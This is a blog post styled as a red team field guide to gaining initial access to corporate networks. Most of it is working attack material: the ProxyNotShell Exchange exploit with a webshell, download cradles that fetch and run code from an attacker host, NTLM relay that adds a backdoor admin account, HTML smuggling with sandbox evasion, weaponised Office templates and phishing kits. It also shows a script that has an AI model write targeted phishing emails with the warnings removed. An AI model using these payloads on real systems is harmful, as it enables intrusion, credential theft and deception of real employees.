---
title: "Initial Access: A Red Team Operator's Field Guide"
layout: post
category:
  - RedTeam
description: "Deep technical breakdown of initial access for external penetration tests — Exchange attack chains, credential capture and relay, container-based payload delivery, Office document weaponization, and eight 2026 vectors with full operational stealth methodology."
---

Initial access is where an external engagement becomes real. Everything prior — recon, OSINT, attack surface mapping — builds toward this phase. The goal is a foothold: a process running on a host inside the target environment, or a valid set of domain credentials that opens doors. What kind of foothold determines what the next phase looks like. A SYSTEM shell on an Exchange server is a different situation than a low-priv domain account from a credential spray — both are initial access, but the attack paths diverge immediately.

MITRE maps initial access to TA0001 with over a dozen sub-techniques. In practice, external engagements collapse to three reliable families: exploiting vulnerable perimeter services, abusing exposed authentication services, and social engineering vectors. This guide covers all three in operational depth, with the stealth and detection-evasion context that separates a clean engagement from a noisy one.

---

## Microsoft Exchange: Full Attack Chain

Exchange is the most valuable target on most corporate perimeters. The architectural reason matters: in Active Directory environments, domain credentials are Exchange credentials. One compromised mailbox is one compromised domain account — immediately useful for lateral movement, Kerberoasting, AS-REP roasting, or just reading years of internal communications.

Exchange exposes multiple endpoints with different monitoring profiles. Understanding which to target changes both your success rate and your noise level:

| Endpoint | Path | Auth Type | Monitoring Level |
|---|---|---|---|
| OWA | `/owa` | Forms / NTLM | High |
| ECP | `/ecp` | Forms / NTLM | High |
| EWS | `/ews/exchange.asmx` | NTLM / Basic | Medium |
| ActiveSync | `/Microsoft-Server-ActiveSync` | Basic / NTLM | Low |
| Autodiscover | `/autodiscover` | NTLM | Low |
| OAB | `/oab` | NTLM | Low |
| RPC/MAPI | `/mapi` | NTLM / Kerberos | Medium |

The certificate Subject on port 443 always reveals the internal FQDN and domain name — this is the first thing you pull before touching any Exchange endpoint.

### Unauthenticated OAB Enumeration

Before touching authentication, check whether the Offline Address Book endpoint leaks data without credentials. In some Exchange configurations, `/oab/` is accessible without authentication and returns directory listing XML containing display names, email addresses, and sometimes OAB download paths. This gives you usernames before you've attempted a single login:

```
https://[target]/oab/
```

If the directory listing returns filenames, download the OAB and parse it:

```bash
# Download the OAB .lzx file (filename from directory listing)
curl -k https://10.3.0.252/oab/[guid]/uaddr.lzx -o uaddr.lzx

# Parse with oabextract
oabextract uaddr.lzx oab.out && strings oab.out | grep -i smtp
```

Even when auth is required, the Autodiscover endpoint responds with different error messages depending on whether the domain exists — a useful secondary signal for domain name confirmation.

### Time-Based Username Enumeration

On-premises Exchange performs synchronous LDAP lookups during authentication. For a non-existent user, the LDAP query returns immediately (60–150ms total response time). For a valid user with a wrong password, Exchange must retrieve the account from AD, compute the NTLM response, and return a failed auth — the entire transaction takes 800ms–2s depending on AD load. This delta is consistent and detectable.

The timing difference only exists on OWA, EWS, and Autodiscover on on-prem Exchange — Exchange Online normalizes response times intentionally.

**MailSniper (Windows, OWA endpoint):**

```powershell
. .\MailSniper.ps1
Invoke-UsernameHarvestOWA -ExchHostname 10.3.0.252 -Domain cdbc -UserList .\users.txt -Threads 1 -OutFile .\valid.txt
```

MailSniper self-calibrates by sending 10 requests with random strings, establishing the baseline invalid-user response time, then flags any response that exceeds it by more than 3 standard deviations.

**Burp Suite Intruder (cross-platform, any endpoint):**

Intercept a POST to `/owa/auth.owa`, send to Intruder, mark only the username field as payload, load wordlist, start attack. Add the "Response received" column via `Columns → Response received`. Sort ascending — valid usernames cluster at the top with response times an order of magnitude higher than invalid ones.

The same technique works against `/ews/exchange.asmx` and `/autodiscover/autodiscover.xml` — sometimes with a more pronounced timing gap since EWS performs additional backend operations.

> **Stealth:** Single thread only. Add 3–8 second random jitter between requests — a burst of timing-test requests to OWA at the same interval is a SIEM signature. Prefer the EAS endpoint over OWA: `/Microsoft-Server-ActiveSync` processes fewer log entries per auth attempt in default Exchange configurations, and mobile device logins are common enough that a spray from an unknown IP doesn't immediately stand out. If the target runs a WAF, responses may be normalized — fall back to Burp with a long connection timeout (30s) and look for differences in `Time to first byte` rather than total response time.

### Lockout Detection Before Spraying

Never spray without first establishing the lockout policy. Two reliable methods:

**Via LDAP (requires a foothold or a low-priv cred from timing attack):**

```bash
ldapsearch -H ldap://10.3.0.252 -x -b "DC=cdbc,DC=local" \
  "(objectClass=domainDNS)" lockoutThreshold lockoutDuration lockoutObservationWindow
```

**Via a deliberate over-spray probe (riskier but works without creds):** Use three failed attempts on an account you can monitor (your own test account, or by watching for the 4740 Account Locked Out event on a sacrificial account you don't care about). If it locks after 5 attempts in 30 minutes, never exceed 3 per account per window.

Fine Default Group Policy in Active Directory: lockout threshold is typically 5–10, observation window 30 minutes. Spraying one password per 32 minutes across the full user list stays well under this in almost every environment.

### Password Spraying

**ffuf — fastest and most flexible:**

```bash
ffuf -c \
  -w users.txt:FUZZ1 \
  -w passwords.txt:FUZZ2 \
  -u https://10.3.0.252/owa/auth.owa \
  -t 1 \
  -p 0.1 \
  -mc all \
  -d "destination=https%3A%2F%2F10.3.0.252%2Fowa%2F&flags=4&forcedownlevel=0&username=cdbc%5CFUZZ1&password=FUZZ2&passwordText=&isUtf8=1" \
  -fs 206
```

`-t 1 -p 0.1` enforces sequential requests with a 100ms delay. Failed auth returns 206 bytes — filter it out. Valid credentials return a different size (typically a redirect to `/owa/` returning 302 + larger body). With Cluster Bomb mode (`-mode clusterbomb`) ffuf tests every combination.

**ruler (Linux, tests multiple endpoints automatically):**

```bash
./ruler-linux64 --domain cdbc.local -k brute --users users.txt --passwords passwords.txt -v
```

ruler probes Autodiscover to locate the Exchange server, then tests EWS and Autodiscover endpoints simultaneously. It handles Exchange autodiscovery redirects automatically, which matters when the Exchange server isn't the same host as the advertised Autodiscover URL.

**MailSniper (Windows, EAS endpoint):**

```powershell
Invoke-PasswordSprayEAS -ExchHostname 10.3.0.252 -UserList .\users.txt -Password 'Season2024!'
```

EAS is the preferred target for sprays — it processes fewer log entries per auth attempt in default Exchange configurations, and mobile device logins are common enough that a spray from an unknown IP doesn't immediately stand out.

> **Stealth:** Smart password selection beats large wordlists. Common corporate spray candidates in order of success rate: `[Season][Year]!` (Spring2024!, Winter2025!), `[CompanyName][Year]`, `[Month][Year]@`, `Welcome1`, `Password1`, `[City][Number]!`. These patterns appear in virtually every corporate environment. Check the company's LinkedIn, job postings, and social media for seasonal announcements — "excited for our new FY2025 strategy" tells you what year-based passwords to try. One carefully chosen password sprayed across 500 accounts succeeds in roughly 5% of environments.

### Global Address List Extraction

A single valid Exchange credential gives you the complete mailbox directory. This is frequently more valuable than the credential itself — you now have every username in the organization for a second-round targeted spray.

**Windows (MailSniper, HTTP-based):**

```powershell
Get-GlobalAddressList -ExchHost 10.3.0.252 -UserName cdbc\info -Password Cdbc1234
```

**Linux (impacket-exchanger, NSPI over RPC):**

```bash
# Get available address list GUIDs
impacket-exchanger cdbc/info:Cdbc1234@10.3.0.252 nspi list-tables

# Dump the global list using the returned GUID
impacket-exchanger cdbc/info:Cdbc1234@10.3.0.252 nspi dump-tables -guid [GUID]
```

NSPI (Name Service Provider Interface) operates over RPC port 135/dynamic. If RPC is firewalled, fall back to the HTTP-based OAB dump or use dump_gal.py which wraps EWS:

```bash
python3 dump_gal.py -i 10.3.0.252 -u cdbc\info -p Cdbc1234
```

With the GAL, extract unique first/last name patterns to build a targeted username wordlist. Corporate username formats are predictable — `firstname.lastname`, `flastname`, `f.lastname`. Generate all variants with a tool like `namemash.py` and run a second, targeted spray. Success rate doubles when you know names.

### CVE-2022-41082: ProxyNotShell

When a valid account exists but privilege escalation requires more than credentials, ProxyNotShell is the go-to for unpatched Exchange 2016/2019 environments. The chain links two CVEs: CVE-2022-41040 is a server-side request forgery in Exchange's autodiscover handler that lets an authenticated low-priv user cause the Exchange backend to issue an HTTP request to an attacker-controlled path. CVE-2022-41082 leverages this to reach the PowerShell remoting endpoint running on the backend, which executes PowerShell commands as SYSTEM under Exchange's application pool.

The critical detail: the exploit requires authentication. A domain user with a mailbox is sufficient — no admin rights needed. This makes it combinable with any sprayed credential.

**Version detection:**

```bash
python3 get_version.py https://10.3.0.252/owa
```

ProxyNotShell affects Exchange 2016 through CU22 and Exchange 2019 through CU11. CU23/CU12 patch CVE-2022-41040 specifically.

**Setup:**

```bash
pip3 install requests_ntlm2

# Host the webshell from your machine
python3 -m http.server 80
```

**Execute — the PowerShell command downloads a webshell to the Exchange web root:**

```bash
python3 ProxyNotShell.py https://10.3.0.252 info Cdbc1234 \
  'powershell wget http://10.0.0.3/shell.aspx -O C:\\inetpub\\wwwroot\\aspnet_client\\iisconfig.aspx'
```

The HTTP server will log the incoming GET to `/shell.aspx` — this confirms the PowerShell executed successfully on the server as SYSTEM. The webshell is now in the IIS web root.

**Validate RCE:**

```bash
curl -s -k https://10.3.0.252/aspnet_client/iisconfig.aspx \
  -d 'fl4387hlerf=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll());'
```

Response: `nt authority\system`. From here, drop a C2 implant directly, or use PowerShell to execute in memory:

```bash
# Execute in-memory without touching disk
curl -s -k https://10.3.0.252/aspnet_client/iisconfig.aspx \
  -d 'fl4387hlerf=Response.Write(new ActiveXObject("WScript.Shell").Exec("powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('"'"'http://10.0.0.3/stage.ps1'"'"')\"").StdOut.ReadAll());'
```

> **Stealth:** Webshell naming is an OPSEC decision. Pick a filename that looks like an IIS diagnostic page (`iishealthcheck.aspx`, `warmup.aspx`). Better: use `dir C:\inetpub\wwwroot\aspnet_client\` first and copy an existing filename with a character substitution. Add a password check to the webshell so it returns 404 to any request that doesn't include your secret parameter — this prevents automated web scanners from discovering it during the engagement. After establishing C2, delete the webshell and pivot to a persistence mechanism that doesn't leave a file on web-accessible paths (scheduled task executing a PowerShell download cradle, or a COM hijack).

**Other Exchange CVEs worth checking on every engagement:**

- **CVE-2024-21410** — NTLM relay attack targeting Exchange's NTLM challenge/response. Forces Exchange to authenticate to an attacker-controlled server, then relays the NTLM auth to LDAP to create or escalate accounts. Affects Exchange 2019 before the February 2024 patch.
- **ProxyShell (CVE-2021-34473/34523/31207)** — pre-authentication version of the SSRF+deserialization chain. No credentials required. Exchange 2013/2016/2019 prior to May 2021 CU.
- **CVE-2023-21529** — remote code execution via a deserialization gadget in Exchange's SOAP endpoint. Authenticated, affects Exchange 2016 CU23 and 2019 CU12.

---

## RDP: From Brute Force to Session Takeover

RDP exposure on the perimeter is common in environments without a VPN-first access policy. The authentication surface is the same as domain login — valid domain credentials mean RDP access if the account has the `Allow log on through Remote Desktop Services` right.

### Credential Brute Force

```bash
# NetExec with a wordlist
nxc rdp 10.3.0.252 -u info_desktop -p /usr/share/wordlist/fasttrack.txt

# Spray a single password across multiple accounts
nxc rdp 10.3.0.252 -u users.txt -p 'Summer2024!' --continue-on-success
```

NetExec returns `[+]` for valid credentials and appends `(Pwn3d!)` when the account has explicit RDP rights. Valid credentials without RDP rights still confirm a domain account — useful for Exchange access, SMB enumeration, or Kerberoasting.

**Pre-enumerate usernames with Kerberos (no auth, no lockout):**

```bash
kerbrute userenum --dc 10.3.0.252 -d cdbc.local users.txt
```

AS-REQ preauthentication requests don't require a password and don't increment the lockout counter in default Windows configurations. Use this to confirm which usernames are valid before touching RDP.

**Connect:**

```bash
# Linux
xfreerdp /v:10.3.0.252 /d:cdbc.local /u:info_desktop /p:'Password1' /cert:ignore

# With drive sharing for file transfer
xfreerdp /v:10.3.0.252 /d:cdbc.local /u:info_desktop /p:'Password1' /cert:ignore /drive:share,/tmp/share
```

### RDP Session Hijacking (tscon)

If you have code execution on a host with active RDP sessions — even without the target user's password — you can steal their session. Windows' session management allows SYSTEM to redirect any session to any other without authentication.

```cmd
# List all active sessions
query session

# As SYSTEM: steal session ID 2 (reassign it to console)
tscon 2 /dest:console

# If not already SYSTEM, elevate via service creation
sc.exe create hijack binpath= "cmd.exe /k tscon 2 /dest:console"
sc.exe start hijack
```

When `tscon` runs as SYSTEM, it takes over the target's authenticated session. The target user is ejected and you inherit their full desktop with all their running applications, authenticated browser sessions, and cloud app sessions — no credentials needed, no re-authentication prompt.

> **Stealth:** `tscon` doesn't log to Windows Security event logs. It generates a 4779 (session disconnected) event for the original user and a 4778 (session reconnected) for the new connection — both appear as routine session activity. The operational risk is that the user gets ejected: if they're actively working, they notice immediately. Time this during lunch or after hours, or use it on a server with a session that's been idle for hours (visible in `query session` output as `Disc` status).

### SharpRDP — Execution Without Interactive Desktop

SharpRDP executes commands on RDP-enabled hosts without opening a visible interactive desktop. It authenticates over RDP and uses the Remote Desktop input simulation API to run commands in the existing session context:

```bash
# Via Wine on Linux, or natively on Windows
SharpRDP.exe computername=10.3.0.252 command="powershell -enc [base64]" username=cdbc\info_desktop password=Password1
```

This is useful when the target environment monitors for new interactive RDP logins but not for existing session input events.

---

## Credential Capture and Relay

### NTLM Hash Capture via Coerced Authentication

Windows auto-authenticates with NTLM when resolving UNC paths (`\\server\share`). Send a victim any context where their machine resolves a UNC path to your server, and you get their Net-NTLMv2 hash without any interaction beyond clicking a link or opening a file.

**Listener setup:**

```bash
impacket-smbserver -smb2support share /tmp/capture
```

**Trigger via email link:** A UNC path embedded in an email body resolves automatically in Outlook's preview pane — no click required:

```
\\10.0.0.3\share\Q3-Budget-Review.pdf
```

**Capture output:**

```
[*] AUTHENTICATE_MESSAGE (CDBC\bilbo_hr, DC-LAB1)
[*] bilbo_hr::CDBC:aaaaaaaaaaaaaaaa:B2C3D4...:[full NetNTLMv2 hash]
```

**Crack offline:**

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
# NetNTLMv2 cracking speed: ~10 billion/sec on RTX 4090
```

> **Stealth:** Port 445 is blocked on egress in most environments. Use WebDAV instead — it triggers NTLM auth over port 80 or 443, which is always allowed outbound. Responder handles WebDAV automatically:
>
> ```bash
> sudo responder -I eth0 -v --lm
> ```
>
> Send the link as `http://10.0.0.3/share/Q3-Budget.xlsx` (HTTP, not UNC notation) — Windows WebDAV client triggers NTLM auth against HTTP URLs that return a `401 WWW-Authenticate: NTLM` response. From the victim's perspective it's an ordinary HTTP link. Use a convincing URL like `http://sharepoint-docs.company-helpdesk.com/shared/Q3-Report.xlsx` with a domain you control.

### NTLM Relay (ntlmrelayx)

Instead of capturing hashes for offline cracking, relay the authentication challenge directly to another service. This is faster than cracking and doesn't require a weak password — any valid hash relays successfully regardless of password strength.

**Relay to LDAP to escalate a user to DA (if LDAP signing is not enforced):**

```bash
# Don't start Responder's SMB/HTTP servers — ntlmrelayx handles them
sudo responder -I eth0 -P -v --disable-ess

# Relay captured NTLM to LDAP and escalate the victim account
impacket-ntlmrelayx -t ldap://10.3.0.252 --escalate-user info
```

When a user's hash is relayed to LDAP, ntlmrelayx uses DCSync or ACL abuse to elevate privileges — no password brute force required.

**Relay to SMB for remote code execution (requires SMB signing disabled on target):**

```bash
impacket-ntlmrelayx -t smb://10.3.0.100 -smb2support \
  -c "net user backdoor 'P@ssword123' /add && net localgroup administrators backdoor /add"
```

Check whether SMB signing is required before attempting:

```bash
nxc smb 10.3.0.0/24 --gen-relay-list relay_targets.txt
```

NetExec outputs a list of hosts with signing disabled — these are relay targets. Hosts with signing required drop relay attempts.

**Relay NTLM to ADCS (Active Directory Certificate Services) for a domain certificate:**

```bash
# If ADCS HTTP enrollment is available and web enrollment doesn't require signing
impacket-ntlmrelayx -t http://ca.cdbc.local/certsrv/certfnsh.asp \
  --adcs --template User
```

This issues a valid domain certificate for the victim user. The certificate can be used to request a TGT via PKINIT — full Kerberos authentication without knowing the password, and the ticket is valid for the certificate's lifetime (typically 1 year).

---

## Phishing and Payload Delivery

### NTLM Capture via Document Fields

Office documents support dynamic content fields that load external resources on open. No macros, no user interaction beyond opening the document.

**Word: IncludePicture field with UNC path**

Insert → Quick Parts → Field → `IncludePicture` → value: `\\10.0.0.3\share\logo.png`

Save the document. When opened, Word attempts to load the image from your SMB/WebDAV server and presents NTLM credentials automatically.

**Additional file types that trigger outbound NTLM auth:**

| File Type | Trigger Mechanism |
|---|---|
| `.docx` | `IncludePicture`, `INCLUDEPICTURE`, linked images |
| `.rtf` | `\object` with `objhtmlimport` referencing UNC path |
| `.iqy` (Excel Web Query) | Any URL — Excel WebDAV-authenticates automatically |
| `.url` | IconFile UNC path (`IconFile=\\10.0.0.3\share\icon.ico`) |
| `.lnk` | Icon location pointing to UNC path |
| `.xls` | DDE field with external resource reference |
| `.pdf` | `/GoToR` action with remote file path (Acrobat Reader auto-auths) |

`.iqy` is particularly effective because it's a text file email gateways don't scan for malicious content:

```
WEB
1
http://10.0.0.3/query.iqy
```

Excel fetches this URL using Windows NTLM auth, even from an HTTP link. The victim sees a "refreshing data" spinner for 2 seconds and nothing else.

**Responder for capture (handles all protocols):**

```bash
sudo responder -I tun0 -v
```

> **Stealth:** `.url` files are invisible to most email gateways since they're just shortcut files. Embed them in a `.zip` with a convincing filename structure — `Q3-Reports.zip` containing `Q3-Summary.pdf` and `Q3-Data.url`. When extracted and the shortcut is navigated to, the UNC path in the IconFile triggers auth silently in the background before the shortcut even opens. The victim sees nothing unusual.

### HTML Smuggling

Email gateways inspect body links and attachment MIME types. They cannot execute JavaScript. HTML smuggling encodes the payload inside the page as a JavaScript blob — the gateway scans clean HTML, the browser decodes and downloads the payload automatically.

**Basic template:**

```html
<html><body><script>
function b64(b) {
  var s = window.atob(b), l = s.length,
      a = new Uint8Array(l);
  for (var i = 0; i < l; i++) a[i] = s.charCodeAt(i);
  return a.buffer;
}
var f = 'BASE64_PAYLOAD';
var blob = new Blob([b64(f)], {type:'octet/stream'});
var a = document.createElement('a');
a.href = window.URL.createObjectURL(blob);
a.download = 'Report-Q3-2025.zip';
a.click();
</script></body></html>
```

```bash
# Encode payload
base64 -w0 payload.zip > payload.b64
# Paste into f = '...'
```

**Advanced: XOR + base64 with anti-sandbox checks**

```html
<script>
// Anti-sandbox: only trigger if real browser environment
if (screen.width > 800 && navigator.plugins.length > 2 && 
    typeof window.chrome !== 'undefined') {

  var key = 0x5A;
  var enc = 'XOR_THEN_BASE64_ENCODED_PAYLOAD';
  
  function decode(s, k) {
    var raw = atob(s);
    var out = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i) ^ k;
    return out.buffer;
  }
  
  // Delay execution by 3 seconds — evades timeout-based sandboxes
  setTimeout(function() {
    var blob = new Blob([decode(enc, key)], {type:'octet/stream'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'SecureDocument-2025.zip';
    document.body.appendChild(a);
    a.click();
  }, 3000);
}
</script>
```

Encode:

```python
import base64

key = 0x5A
with open('payload.zip', 'rb') as f:
    raw = f.read()

xored = bytes(b ^ key for b in raw)
print(base64.b64encode(xored).decode())
```

Host the page on a credible-looking HTTPS domain. The browser downloads without a file server request — the payload comes entirely from within the HTML page itself, which is why gateway inspection misses it.

> **Stealth:** The `.html` file itself should have a convincing structure beyond just the script tag. Wrap it in a realistic-looking SharePoint document preview page — logo, "Your document is loading...", progress spinner. This explains the delay from the anti-sandbox timer and reduces user suspicion if they notice the file download.

### ISO Container Delivery — MOTW Bypass

Microsoft's Mark-of-the-Web (MOTW) protection stamps downloaded files with a Zone.Identifier alternate data stream (`Zone.Identifier: ZoneId=3`). SmartScreen and macOS Gatekeeper read this stamp to decide whether to warn the user. ISO and IMG filesystem images don't support NTFS alternate data streams — files extracted from a mounted ISO don't carry MOTW. This means an executable inside an ISO bypasses SmartScreen entirely, regardless of what the executable does.

```bash
# Create payload directory
mkdir iso_stage
cp agent.exe iso_stage/
# Create a convincing LNK that points to agent.exe
# (Windows: right-click → Create Shortcut, rename to "Report.lnk")

# Build ISO
genisoimage -o payload.iso -J -r -V "Q3_Reports" iso_stage/
```

Delivery chain: Email → `.zip` link (HTML smuggling) → `.iso` inside zip → victim mounts ISO → clicks `Report.lnk` → agent.exe executes with no SmartScreen warning.

The LNK approach avoids requiring the victim to know to run an `.exe`. Make the LNK icon match a PDF or Word document icon by setting `IconLocation` to `C:\Windows\System32\imageres.dll,13` (PDF icon).

### LOLBAS Download Cradles

Living-off-the-land binaries execute your payload using signed Windows system binaries — impossible to block by binary signature since they're built into Windows.

```cmd
# certutil — downloads and caches arbitrary files
certutil -urlcache -split -f http://10.0.0.3/agent.exe C:\Windows\Temp\svc32.exe

# bitsadmin — asynchronous background transfer (survives disconnects)
bitsadmin /transfer job /download /priority normal http://10.0.0.3/agent.exe C:\Temp\svc32.exe

# msiexec — executes MSI packages from HTTP (no file written if using /i flag with /q)
msiexec /q /n /i http://10.0.0.3/payload.msi

# regsvr32 "Squiblydoo" — executes JScript/VBScript via COM registration
regsvr32 /s /n /u /i:http://10.0.0.3/payload.sct scrobj.dll

# PowerShell download cradle (most common, increasingly monitored)
powershell -nop -w hidden -c "iex(New-Object Net.WebClient).DownloadString('http://10.0.0.3/stage.ps1')"

# PowerShell with TLS and no disk touch
powershell -nop -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex(iwr('http://10.0.0.3/stage.ps1')-UseBasicParsing).Content"
```

> **Stealth:** `certutil -urlcache` and `bitsadmin` are heavily monitored and appear in most EDR detection libraries. Prefer `regsvr32` (Squiblydoo) or msiexec for first-stage delivery. `msiexec /q /n /i http://...` downloads and executes an MSI completely silently and is less flagged than the others. The MSI can contain a custom action that runs arbitrary commands during installation — no files dropped, execution via Windows Installer's trusted process.

### Malicious Office Macros

The direct embedded macro approach (`Document_Open()` → `Shell()`) is caught by every modern EDR. The professional approach is template injection — the document itself contains no macro and passes all static analysis clean.

**Template injection implementation:**

A DOCX is a ZIP archive. Open it, modify two files, repack:

**`word/settings.xml`** — add a remote template reference:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId1"/>
</w:settings>
```

**`word/_rels/settings.xml.rels`** — point the relationship to your attacker-controlled template:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    Target="http://10.0.0.3/templates/corporate.dot"
    TargetMode="External"/>
</Relationships>
```

```bash
mkdir docx_stage && cp clean.docx docx_stage/ && cd docx_stage
unzip clean.docx -d extracted/

# Edit the two files above
vim extracted/word/settings.xml
vim extracted/word/_rels/settings.xml.rels

# Repack
cd extracted && zip -r ../../weaponized.docx .
```

Host `corporate.dot` on your web server — this file contains the actual macro. When the victim opens `weaponized.docx`, Word fetches the template, loads it, and executes the macro. The gateway scanned a clean DOCX. The macro arrived at runtime.

**Template `corporate.dot` macro — WMI execution (avoids Shell() call):**

```vba
Sub Document_Open()
    Dim wmi As Object
    Dim proc As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set proc = wmi.Get("Win32_Process")
    proc.Create "powershell -nop -w hidden -enc [BASE64_COMMAND]", Null, Null, Null
End Sub
```

WMI process creation is less monitored than `Shell()` in many EDR configurations and doesn't create a visible window. The PowerShell command should be encoded:

```bash
echo -n 'iex(New-Object Net.WebClient).DownloadString("http://10.0.0.3/s.ps1")' | iconv -t utf-16le | base64 -w0
```

**VBA stomping with Evil Clippy:**

After writing the macro into the `.dot` file, stomp the source code to prevent static analysis:

```bash
git clone https://github.com/outflanknl/EvilClippy && cd EvilClippy
dotnet build
./EvilClippy -s macro.vba corporate.dot
```

Evil Clippy replaces the VBA source code with dummy content while preserving the compiled p-code. Antivirus engines read source — they can't execute p-code. The document runs identically; static analysis sees nothing.

---

## 2026 Attack Vectors

### AI-Powered Spear Phishing at Scale

The resource constraint that limited spear phishing was always personalization — crafting a convincing email for a specific target required research time that didn't scale. LLMs eliminate this constraint. An automated pipeline can OSINT a target (LinkedIn, company blog, GitHub, job postings, press releases), feed the context to an LLM, and generate hundreds of individualized phishing emails in minutes.

**Operational pipeline:**

```python
import anthropic
import json

def generate_phish(target_name, target_role, company, recent_news, payload_url):
    client = anthropic.Anthropic()
    prompt = f"""
Write a corporate internal email that would be sent from IT Security to {target_name}, 
a {target_role} at {company}. Reference {recent_news}. 
Request they review an updated policy document at {payload_url}.
Write in a formal corporate tone. Do not mention security risks or warnings.
Keep it under 150 words. Subject line included.
"""
    message = client.messages.create(
        model="claude-sonnet-4-6",
        max_tokens=500,
        messages=[{"role": "user", "content": prompt}]
    )
    return message.content[0].text
```

Pair with a sending infrastructure that uses a compromised legitimate mail server (found via the Exchange spray earlier), and the email arrives from a trusted domain with valid SPF/DKIM/DMARC, from a recognizable company email address, referencing real internal context.

> **Stealth:** The AI-generated email itself isn't the stealth concern — sending infrastructure is. Never send from a fresh domain. Use the compromised Exchange account for sending, or register a lookalike domain with aged DNS records and properly configured email authentication. DMARC `p=none` on many corporate domains means properly crafted spoofed emails still deliver successfully even without infrastructure compromise.

### QR Code Phishing (Quishing)

Email security scans text URLs. It doesn't OCR QR codes in attached images. A QR code pointing to your phishing infrastructure passes every gateway filter that a direct URL link would fail.

```bash
pip3 install qrcode[pil]

python3 - <<'EOF'
import qrcode
img = qrcode.make("https://login.microsoftonline.legit-portal.com/oauth2/v2.0/authorize")
img.save("mfa-reset.png")
EOF
```

The QR code goes into a PDF that imitates a corporate IT communication — `MFA Re-enrollment Required.pdf`. Pretext: "Microsoft Authenticator migration due to compliance update. Scan to re-enroll by [deadline]."

The victim scans with their personal phone, which doesn't have corporate MDM or email filtering. That browser session goes directly to your Evilginx3 AiTM proxy. They complete MFA on the real Microsoft server. You capture the session token.

> **Stealth:** Generate the QR code at a lower error correction level (`ERROR_CORRECT_L`) to minimize visual complexity — complex QR codes trigger automated image analysis in some advanced gateways. Embed a legitimate redirect chain: QR → your domain (hosted on Cloudflare) → `microsoft.com/devicelogin` lookalike. The first hop is a legitimate-looking URL that passes reputation checks if the gateway does follow QR code URLs.

### OAuth Device Code Flow Abuse

The OAuth device authorization grant is designed for input-constrained devices (smart TVs, CLI tools). The attacker initiates a device auth flow, obtains a `user_code`, and socially engineers the victim into entering it on `microsoft.com/devicelogin`. There's no fake login page — the victim authenticates on a completely legitimate Microsoft domain.

```powershell
# TokenTactics v2
git clone https://github.com/f-bader/TokenTacticsV2
Import-Module .\TokenTacticsV2\TokenTactics.psd1

# Initiate device code flow — outputs user_code and verification_uri
Get-AzureToken -Client MSGraph

# Poll for completion (wait for victim to enter code)
# TokenTactics polls automatically and returns tokens when complete
```

Once the victim approves, you receive:
- **Access token** — 1-hour bearer token for MSGraph, Exchange, SharePoint
- **Refresh token** — long-lived (typically 90 days), can mint new access tokens
- **Optionally PRT** — if the device code was approved from a compliant device

```powershell
# Use the access token to read victim's email
$headers = @{ Authorization = "Bearer $accessToken" }
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers $headers
```

> **Stealth:** The `user_code` in the phishing email must look urgent and plausible. Best pretext: "Your device has been flagged by our security monitoring system. Verify device identity within 24 hours or your account will be suspended. Visit microsoft.com/devicelogin and enter: ABCD-EFGH." Microsoft's domain in the email body is the actual Microsoft domain — no spoofing. URL scanning tools pass it clean.

### Microsoft Teams Cross-Tenant Phishing

Default M365 tenant configuration allows external organizations to initiate Teams conversations with your users. An attacker creates a tenant with a display name mimicking IT/security teams and sends direct messages to targets.

```bash
git clone https://github.com/Octoberfest7/TeamsPhisher
pip3 install -r requirements.txt

# Enumerate which users accept external Teams messages
python3 TeamsPhisher.py -u attacker@red-team-tenant.onmicrosoft.com \
  -p 'Password123!' \
  -e targets.txt \
  --nogreeting

# Send message with attachment link to all valid targets
python3 TeamsPhisher.py -u attacker@red-team-tenant.onmicrosoft.com \
  -p 'Password123!' \
  -l targets.txt \
  -m pretext.txt \
  -a http://10.0.0.3/payload.html
```

The message arrives in the victim's Teams as a notification from an "external" user — but the display name is "Microsoft IT Support" or "[Company] Security Team" and the notification is indistinguishable from an internal one at first glance.

> **Stealth:** Teams messages bypass email security entirely — no gateway, no URL scanning, no attachment inspection. SharePoint-hosted payloads (from your M365 tenant's SharePoint) pass URL reputation checks because they're on microsoft.com. Register your tenant with a convincing display name, set a professional profile picture, and populate the account with some activity before launching to avoid Microsoft's newly-account-flagging heuristics.

### Browser-in-the-Browser (BitB)

BitB renders a fake browser popup window using CSS and HTML — complete with an address bar showing `microsoft.com`, window chrome, minimize/maximize buttons. When the victim sees a popup on a page asking them to "Sign in with Microsoft" and the popup window looks exactly like a real Chrome OAuth window showing `microsoft.com/oauth2/authorize`, the address bar provides false confidence.

The complete implementation is available in mr.d0x's BitB kit. Key customization for targeting Microsoft/O365:

```html
<!-- Outer page triggers the fake popup -->
<div id="window" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
  width:450px; height:580px; background:white; border-radius:8px;
  box-shadow:0 24px 54px rgba(0,0,0,0.5); z-index:9999;">
  
  <div style="background:#f5f5f5; padding:10px; border-radius:8px 8px 0 0; display:flex; align-items:center; gap:8px;">
    <div style="display:flex; gap:4px;"><div style="width:12px;height:12px;border-radius:50%;background:#ff5f57"></div>
    <div style="width:12px;height:12px;border-radius:50%;background:#ffbd2e"></div>
    <div style="width:12px;height:12px;border-radius:50%;background:#28c840"></div></div>
    <!-- Fake address bar showing microsoft.com -->
    <div style="flex:1;background:white;border:1px solid #ddd;border-radius:4px;padding:4px 8px;
      font-family:sans-serif;font-size:12px;color:#555;">
      🔒 microsoft.com/oauth2/v2.0/authorize
    </div>
  </div>
  
  <!-- Actual credential form (submits to your server) -->
  <iframe src="https://yourserver.com/fake-ms-login" style="width:100%;height:calc(100%-40px);border:none;"></iframe>
</div>
```

